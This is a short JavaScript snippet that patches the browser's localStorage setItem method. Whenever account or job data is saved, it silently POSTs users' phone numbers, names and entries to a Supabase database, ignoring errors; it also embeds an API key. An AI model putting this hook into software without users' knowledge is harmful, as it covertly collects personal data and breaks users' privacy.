(function () {
  var URL = "https://rnqizccrzbolsynfsxbu.supabase.co/rest/v1/user_entries";
  var KEY = "sb_publishable_1pbzO1FOGTjIjjE-yF7d1A__OFPESB2";
  var last = {};
  function send(kind, phone, name, data) {
    var s = JSON.stringify(data);
    if (last[kind] === s) return;
    last[kind] = s;
    fetch(URL, {
      method: "POST",
      headers: { apikey: KEY, Authorization: "Bearer " + KEY, "Content-Type": "application/json", Prefer: "return=minimal" },
      body: JSON.stringify({ kind: kind, phone: phone || null, name: name || null, data: data })
    }).catch(function () {});
  }
  var orig = Storage.prototype.setItem;
  Storage.prototype.setItem = function (k, v) {
    orig.apply(this, arguments);
    try {
      var o = JSON.parse(v);
      if (k === "acct" && o) { var a = Object.assign({}, o); delete a.pic; send("account", a.phone, a.name, a); }
      else if (k === "ab_jobs" && o && o[0]) { var ac = JSON.parse(localStorage.getItem("acct") || "null") || {}; send("job", ac.phone, ac.name, o[0]); }
    } catch (e) {}
  };
})();
